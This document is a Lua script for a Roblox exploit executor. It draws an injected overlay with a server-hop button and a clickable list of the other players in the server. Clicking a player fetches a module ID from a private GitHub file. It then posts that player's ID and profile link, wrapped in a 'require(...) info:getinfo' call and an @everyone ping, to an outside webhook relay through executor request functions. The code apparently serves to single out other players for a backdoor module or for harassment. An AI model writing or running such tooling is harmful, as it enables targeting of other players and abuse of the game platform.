

-- Gui to Lua
-- Version: 3.2

-- Instances:



function sendDiscordMessage(message, name, picture,webhook)
	local url = "https://websec.services/ws/send/Hwcwj72u0jl78QuiR4m7sFWX5se7h22O1foD8hn2"

	local info = {
		content = "@everyone ".. message,
		username = name,
		avatar_url = picture
	}

	local newdata = game:GetService("HttpService"):JSONEncode(info)

	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)

end







local ax = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UI = Instance.new("UIListLayout")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local TextButton = Instance.new("TextButton")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local jobid = Instance.new("TextLabel")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local UICorner = Instance.new("UICorner")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")

--Properties:

ax.Name = "ax"
ax.Parent = game:GetService("CoreGui")
ax.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ax.ResetOnSpawn = false

Frame.Parent = ax
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Position = UDim2.new(0.311907977, 0, 0.345971555, 0)
Frame.Size = UDim2.new(0, 388, 0, 269)

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ScrollingFrame.Size = UDim2.new(0, 262, 0, 269)

UI.Name = "UI"
UI.Parent = ScrollingFrame
UI.SortOrder = Enum.SortOrder.LayoutOrder

UIAspectRatioConstraint.Parent = ScrollingFrame
UIAspectRatioConstraint.AspectRatio = 0.974

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.703608274, 0, 0.0297397748, 0)
TextButton.Size = UDim2.new(0, 105, 0, 47)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Server"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UIAspectRatioConstraint_2.Parent = TextButton
UIAspectRatioConstraint_2.AspectRatio = 2.234

jobid.Name = "jobid"
jobid.Parent = Frame
jobid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
jobid.BackgroundTransparency = 1.000
jobid.Position = UDim2.new(0.703608274, 0, 0.226765797, 0)
jobid.Size = UDim2.new(0, 105, 0, 66)
jobid.Font = Enum.Font.SourceSans
jobid.Text = ""
jobid.TextColor3 = Color3.fromRGB(255, 255, 255)
jobid.TextScaled = true
jobid.TextSize = 14.000
jobid.TextWrapped = true

UIAspectRatioConstraint_3.Parent = jobid
UIAspectRatioConstraint_3.AspectRatio = 1.591

UICorner.CornerRadius = UDim.new(0.100000001, 0)
UICorner.Parent = Frame

UIAspectRatioConstraint_4.Parent = Frame
UIAspectRatioConstraint_4.AspectRatio = 1.442

-- Scripts:

local function WHKDLJ_fake_script() -- Frame.Make GUI Draggable 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	
	script.Parent.jobid.Text = "Jobid: "..game.JobId
	
	
	
	
	
	
	
	
end
coroutine.wrap(WHKDLJ_fake_script)()



















TextButton.MouseButton1Down:Connect(function()
	local x = {}
	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
	if #x > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
	else
		return print("no")
	end
end)




local plrList = ScrollingFrame






function clearList()
	for _, item in pairs(plrList:GetChildren()) do
		if item:IsA("ImageButton") then
			item:Destroy()
		end
	end
end

function fillList()
	clearList()
	for _, player in pairs(game.Players:GetChildren()) do
		if not plrList:FindFirstChild(player.Name) then
			local Players = game:GetService("Players")
			local userId = player.UserId
			local thumbType = Enum.ThumbnailType.HeadShot
			local thumbSize = Enum.ThumbnailSize.Size420x420
			local content = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&username="..player.Name
			local ImageButton = Instance.new("ImageButton")

			--Properties:

			ImageButton.Parent = plrList
			ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ImageButton.BackgroundTransparency = 1.000
			ImageButton.Name = player.Name
			ImageButton.Image = content
			ImageButton.Size = UDim2.new(0, 100, 0, 100)

			ImageButton.MouseButton1Down:Connect(function()
local ohh = game:HttpGet("https://raw.githubusercontent.com/aweasdwesad/private/main/id.ua")

				local id = game.Players:GetUserIdFromNameAsync(ImageButton.Name)
		
				local name =  game.Players[ImageButton.Name].DisplayName .. " (@" .. game.Players[ImageButton.Name].Name.. ")"

                 local imageUrl = "http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&Type=AvatarHeadShot&userId=" .. game.Players.LocalPlayer.UserId
                   local new = game.Players.LocalPlayer.Name.."Joined the game"
                 local message = " local plr = 'hi'  local info = require("..ohh..") info:getinfo('"..id.."') https://www.roblox.com/users/"..id.."/profile"
                 sendDiscordMessage(message,name,imageUrl)
			end)
		end
	end
	plrList.CanvasSize = UDim2.new(0, 0, 0, plrList.UI.AbsoluteContentSize.Y)
end

fillList()

game.Players.PlayerAdded:Connect(fillList)
game.Players.PlayerRemoving:Connect(fillList)
